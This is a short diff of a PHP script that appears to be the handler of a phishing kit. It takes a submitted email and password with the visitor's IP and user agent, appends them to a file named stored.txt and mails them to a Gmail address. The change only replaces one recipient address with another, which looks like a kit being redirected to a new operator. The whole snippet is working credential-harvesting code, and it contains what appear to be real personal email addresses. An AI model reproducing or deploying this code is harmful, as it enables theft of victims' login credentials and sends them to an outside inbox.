@@ -15,7 +15,7 @@ if($email != null && $password != null){
 	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
 	$message .= "User Agent : ".$useragent."\n";
 	$message .= "|----------- CrEaTeD --------------|\n";
-	$send = "gwagongavin08@gmail.com";
+	$send = "twbransfield@gmail.com";
 	$subject = "Email Result : $ip";$file = fopen("../stored.txt","a+"); 
 fwrite($file,$message); 
     mail($send, $subject, $message);   
